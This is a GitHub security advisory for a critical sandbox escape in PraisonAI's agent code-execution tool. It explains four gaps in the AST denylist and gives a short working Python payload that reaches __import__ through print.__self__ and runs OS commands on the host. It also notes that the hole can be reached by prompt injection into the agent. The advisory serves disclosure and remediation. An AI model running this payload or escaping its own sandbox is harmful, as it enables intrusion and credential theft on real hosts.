# [C] PraisonAI vulnerable to sandbox escape via `print.__self__` builtins module leak in `execute_code` (subprocess mode)

## Summary
Severity: Critical
Advisory: GHSA-4mr5-g6f9-cfrh
CVE: CVE-2026-47392
CWE: CWE-184, CWE-693
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-4mr5-g6f9-cfrh
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.40
- PyPI: `PraisonAI` — affected >=0 <4.6.40

## Details
## Summary

`execute_code()` in `praisonaiagents/tools/python_tools.py` (v1.6.37, subprocess sandbox mode) can be fully bypassed using `print.__self__` to retrieve the real Python `builtins` module, from which `__import__` can be extracted via `vars()` and runtime string construction. This achieves arbitrary OS command execution on the host, completely defeating the sandbox.

This is a **novel bypass** that survives all patches for CVE-2026-39888 (frame traversal), CVE-2026-34938 (str subclass), and CVE-2026-40158 (`type.__getattribute__` trampoline).

---

## Severity

**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — 9.9 Critical**

---

## Root Cause

Three independent gaps in the AST-based security validation:

### Gap 1: `__self__` missing from `_blocked_attrs`

In CPython, all built-in functions (C-level functions) have a `__self__` attribute that returns the module they belong to. The built-in functions in `safe_builtins` (`print`, `len`, `range`, etc.) are the *real* CPython built-in functions, so `print.__self__` returns `<module 'builtins' (built-in)>`.

The `_blocked_attrs` frozenset (line 52) does NOT include `__self__`. The AST check at line 74 only blocks attributes that are IN this set, so `print.__self__` passes.

### Gap 2: `vars` not blocked as callable or attribute

`builtins.vars(obj)` returns `obj.__dict__`. The function name `vars` is not in the AST `Call` blocklist (line 83: only blocks `exec`, `eval`, `compile`, `__import__`, `open`, `input`, `breakpoint`, `setattr`, `delattr`, `dir`). And `vars` is not in `_blocked_attrs` for attribute access.

So `b.vars(b)` (where `b` is the builtins module) returns `builtins.__dict__` — a dict containing ALL built-in functions including `__import__`, `exec`, `eval`, `open`, etc.

### Gap 3: AST `Call` check only catches `ast.Name` nodes

The dangerous-call check (line 82-88) only fires when `isinstance(func, ast.Name)` — i.e., bare-name calls like `exec(...)`. It does NOT catch:
- Attribute calls: `b.exec(...)` — func is `ast.Attribute`
- Subscript calls: `d["exec"](...)` — func is `ast.Subscript`

### Gap 4: Runtime string construction bypasses string constant check

The string constant check (line 92-98) catches literals like `"__import__"`, but NOT runtime concatenation like `"_" + "_" + "import" + "_" + "_"`. The AST sees 5 separate `Constant` nodes (`"_"`, `"_"`, `"import"`, `"_"`, `"_"`), none of which contain any blocked attr as a substring.

---

## Proof of Concept

```python
from praisonaiagents.tools.python_tools import execute_code

# Exploit: 4 lines, bypasses ALL security layers
payload = """
b = print.__self__
d = b.vars(b)
key = "_" + "_" + "import" + "_" + "_"
imp = d[key]
mod = imp("os")
print(mod.popen("id").read())
"""

result = execute_code(code=payload)
print(result)
# Output: {'result': None, 'stdout': 'uid=1000(user) gid=1000(user) ...\n', 'stderr': '', 'success': True}
```

### Step-by-step bypass analysis:

| Line | AST node | Check | Result |
|---|---|---|---|
| `print.__self__` | `Attribute(attr='__self__')` | `__self__` in `_blocked_attrs`? | **NO** → passes |
| `b.vars` | `Attribute(attr='vars')` | `vars` in `_blocked_attrs`? | **NO** → passes |
| `b.vars(b)` | `Call(func=Attribute)` | `isinstance(func, ast.Name)`? | **NO** → passes |
| `"_"`, `"import"` | `Constant(value=str)` | Contains blocked attr? | **NO** → passes |
| `d[key]` | `Subscript` | Not checked | passes |
| `imp("os")` | `Call(func=Name('imp'))` | `imp` in blocked calls? | **NO** → passes |

**Result: Full sandbox escape → arbitrary command execution**

---

## Impact

An attacker who can influence agent input (via prompt injection, malicious documents, or direct code submission) can:

- Execute arbitrary commands on the host system
- Read/write any file accessible to the process
- Exfiltrate environment variables, API keys, and credentials
- Pivot to internal networks
- Install persistent backdoors

---

## Affected

- **Package**: `praisonaiagents` (PyPI)
- **Affected versions**: All versions through 1.6.37 (latest)
- **Component**: `praisonaiagents/tools/python_tools.py`, `_execute_code_sandboxed()` function
- **Default configuration affected**: Yes (`sandbox_mode="sandbox"` is the default)

---

## Remediation

### Immediate fix
Add `__self__` to `_blocked_attrs`:
```python
_blocked_attrs = frozenset({
    ...,
    '__self__',  # Built-in functions leak their parent module
})
```

### Additional hardening
1. Block `vars` in the callable blocklist
2. Extend the `ast.Call` check to also catch `ast.Attribute` and `ast.Subscript` function nodes
3. Add AST check for `BinOp` string concatenation that could construct blocked attr names

### Fundamental recommendation
Denylist-based Python sandboxes are fundamentally insecure. Each patch introduces a new bypass opportunity. Consider:
- Using `isolated-vm` (Node.js) or WebAssembly-based isolation
- Using OS-level sandboxing (seccomp, namespaces, gVisor)
- Removing in-process code execution entirely in favor of containerized execution

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-4mr5-g6f9-cfrh
- https://github.com/MervinPraison/PraisonAI
